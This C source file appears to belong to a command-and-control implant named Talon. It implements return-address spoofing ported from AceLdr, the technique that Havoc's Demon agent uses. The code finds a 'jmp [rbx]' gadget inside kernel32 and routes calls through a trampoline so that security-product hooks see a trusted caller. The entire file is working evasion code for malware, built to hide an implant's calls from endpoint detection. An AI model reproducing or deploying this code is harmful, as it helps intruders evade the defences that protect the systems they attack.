#include <Talon.h>

#include <Core.h>
#include <Spoof.h>

/* Return-address spoofing — ported from AceLdr (kyleavery), which is what
 * Demon (Havoc) ships. The target function's return address is replaced with
 * a `jmp [rbx]` gadget found inside kernel32, so user-mode hooks that check
 * "who called me" see a system-module address. See Spoof.x64.asm for the
 * trampoline/fixup mechanics. */

extern PVOID Spoof( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, PVOID, PVOID, PVOID, PVOID );

/* Gadget host: kernel32 — the most universally "trusted" module for a hook's
 * caller validation (Demon uses it too). Resolved once at startup. */
static PVOID g_SpoofModule = NULL;
static ULONG g_SpoofSize   = 0;

VOID SpoofInit( VOID )
{
    PIMAGE_DOS_HEADER Dos;
    PIMAGE_NT_HEADERS Nt;

    g_SpoofModule = GetModuleHandleA( "kernel32" );
    if ( ! g_SpoofModule )
        return;

    Dos = ( PIMAGE_DOS_HEADER ) g_SpoofModule;
    if ( Dos->e_magic != 0x5A4D )
        goto FAIL;

    Nt = ( PIMAGE_NT_HEADERS ) ( ( PUCHAR ) g_SpoofModule + Dos->e_lfanew );
    if ( Nt->Signature != 0x00004550 )
        goto FAIL;

    g_SpoofSize = Nt->OptionalHeader.SizeOfImage;

    /* one probe: without a usable `jmp [rbx]` gadget we just call directly */
    if ( ! MmGadgetFind( ( PUCHAR ) g_SpoofModule + 0x1000, ( SIZE_T ) g_SpoofSize - 0x1000, ( PUCHAR ) "\xFF\x23", 2 ) )
        goto FAIL;

    Dbg( "SpoofInit: kernel32 gadget available at module base %p (size %x)\n", g_SpoofModule, g_SpoofSize );
    return;

FAIL:
    g_SpoofModule = NULL;
    g_SpoofSize   = 0;
}

BOOL SpoofReady( VOID )
{
    return g_SpoofModule != NULL;
}

PVOID MmGadgetFind( PVOID Memory, SIZE_T Length, PVOID PatternBuffer, SIZE_T PatternLength )
{
    PUCHAR Mem = ( PUCHAR ) Memory;
    PUCHAR Pat = ( PUCHAR ) PatternBuffer;
    SIZE_T i, j;

    if ( ! Memory || ! Length || ! PatternBuffer || ! PatternLength )
        return NULL;

    for ( i = 0; i + PatternLength <= Length; i++ ) {
        for ( j = 0; j < PatternLength; j++ ) {
            if ( Mem[ i + j ] != Pat[ j ] )
                break;
        }
        if ( j == PatternLength )
            return ( PVOID ) ( Mem + i );
    }

    return NULL;
}

PVOID SpoofRetAddr( PVOID Function,
                    PVOID a, PVOID b, PVOID c, PVOID d,
                    PVOID e, PVOID f, PVOID g, PVOID h )
{
    PRM Param = { 0 };

    if ( ! Function || ! g_SpoofModule || g_SpoofSize <= 0x1000 )
        return NULL;

    /* the probe at init already proved a gadget exists; re-locate it (it is
     * stable for the lifetime of the process, this just finds the first hit) */
    Param.Trampoline = MmGadgetFind( ( PUCHAR ) g_SpoofModule + 0x1000, ( SIZE_T ) g_SpoofSize - 0x1000, ( PUCHAR ) "\xFF\x23", 2 );
    if ( ! Param.Trampoline )
        return NULL;

    Param.Function = Function;
    /* Param.Rbx is filled in by the trampoline */

    return Spoof( a, b, c, d, &Param, NULL, e, f, g, h );
}
